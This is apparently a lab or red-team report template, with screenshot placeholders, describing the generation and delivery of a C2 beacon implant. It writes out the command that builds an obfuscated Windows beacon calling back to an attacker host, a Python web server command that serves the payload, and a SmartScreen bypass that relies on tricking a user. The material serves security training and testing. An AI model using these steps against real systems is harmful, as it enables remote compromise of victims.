# Beacon Generation & Delivery

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

## Generating the Beacon
generate beacon --http 192.168.30.138:6789
--os windows --arch amd64 --save /tmp/beacon.exe

[INSERT SCREENSHOT → PDF showing:
"Generating new windows/amd64 beacon implant binary"
"Symbol obfuscation is enabled"
"Build completed in 41s"
"Implant saved to /tmp/beacon.exe"]

## Key Generation Details
- **Symbol obfuscation enabled** — makes reverse 
  engineering harder
- **Target:** windows/amd64
- **C2 channel:** HTTP to 192.168.30.138:6789

## Delivery via Python HTTP Server
cd /tmp
python3 -m http.server 8080

[INSERT SCREENSHOT → PDF showing Python server 
running with GET requests from 192.168.30.129 
for beacon.exe — multiple download attempts visible]

## AV Evasion — SmartScreen Bypass
[INSERT SCREENSHOT → PDF showing Windows SmartScreen 
"Windows protected your PC" popup with 
"Run anyway" button visible]

Despite SmartScreen warning, beacon executed 
successfully when user clicked "Run anyway" — 
simulating a social engineering scenario where 
a user is tricked into running a malicious file.